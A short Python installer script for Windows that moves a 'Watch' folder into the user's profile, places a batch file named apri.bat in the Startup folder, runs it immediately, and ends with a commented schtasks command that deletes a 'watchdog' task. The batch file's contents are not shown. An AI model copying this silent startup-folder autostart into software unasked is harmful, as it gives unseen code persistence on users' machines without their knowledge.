import os
import shutil
from time import sleep

os.chdir(os.path.dirname(os.path.abspath(__file__)))

USER = os.getlogin()

if os.path.exists(f'C:\\Users\\{USER}\\Watch'):
    os.rmdir(f'C:\\Users\\{USER}\\Watch')

shutil.move('Watch\\', f'C:\\Users\\{USER}\\Watch')
shutil.move(f'C:\\Users\\{USER}\\Watch\\apri.bat', f"C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/")
sleep(1)
os.system(f"\"C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/apri.bat\"")

# schtasks /delete /tn "watchdog" /f